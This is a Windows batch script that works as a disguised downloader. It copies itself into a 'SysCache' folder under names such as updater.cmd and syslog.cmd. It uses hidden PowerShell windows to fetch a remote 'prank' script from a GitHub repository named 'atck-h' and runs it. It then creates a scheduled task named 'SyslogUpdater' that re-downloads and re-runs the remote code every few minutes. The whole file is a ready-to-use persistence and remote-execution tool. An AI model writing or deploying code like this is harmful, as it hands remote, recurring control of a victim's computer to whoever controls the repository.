@echo off
setlocal enabledelayedexpansion

:: ===== EDIT THESE TWO VALUES =====
set "DELAY=3m"        & REM initial delay before first scheduled run (e.g., 5m, 2h, 1d, 30)
set "INTERVAL=2m"     & REM repeat interval after that (same format)
:: =================================

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "INTERVAL_FILE=%BASE%\interval.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
    )
)

:RUN
if exist "%PRANK%" start "" "%PRANK%"

:: --- Convert user‑friendly delay and interval to minutes ---
call :ConvertToMinutes DELAY
call :ConvertToMinutes INTERVAL

:: Save the repeat interval so scheduled runs can read it
echo !INTERVAL! > "%INTERVAL_FILE%"

:: Calculate start time = now + DELAY minutes
if !DELAY! gtr 0 (
    for /f "tokens=*" %%a in ('
        powershell -Command "$t=(Get-Date).AddMinutes(!DELAY!); $t.ToString('HH:mm')"
    ') do set "START_TIME=%%a"
    set "START_OPT=/st !START_TIME!"
) else (
    set "START_OPT="   & REM no delay → run at next schedule moment
)

:: (Re)create the task only if it doesn't exist or interval changed
schtasks /query /tn "SyslogUpdater" >nul 2>&1
if errorlevel 1 (
    :: Task doesn't exist – create it
    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !INTERVAL! !START_OPT! /f /DELAY 0001:00 >nul 2>&1
) else (
    :: Task exists – check if repeat interval changed
    for /f "tokens=6 delims= " %%i in ('schtasks /query /tn "SyslogUpdater" /fo list ^| find "Repeat: Every"') do set "CURRENT_REPEAT=%%i"
    if not "!CURRENT_REPEAT!"=="!INTERVAL!" (
        schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
        schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !INTERVAL! !START_OPT! /f /DELAY 0001:00 >nul 2>&1
    )
)

endlocal
goto :EOF

:ConvertToMinutes
set "VAR=%~1"
set "VAL=!%VAR%!"
if /i "!VAL:~-1!"=="m" set /a "VAL=!VAL:~0,-1!" & set "%VAR%=!VAL!"
if /i "!VAL:~-1!"=="h" set /a "VAL=!VAL:~0,-1! * 60" & set "%VAR%=!VAL!"
if /i "!VAL:~-1!"=="d" set /a "VAL=!VAL:~0,-1! * 1440" & set "%VAR%=!VAL!"
goto :EOF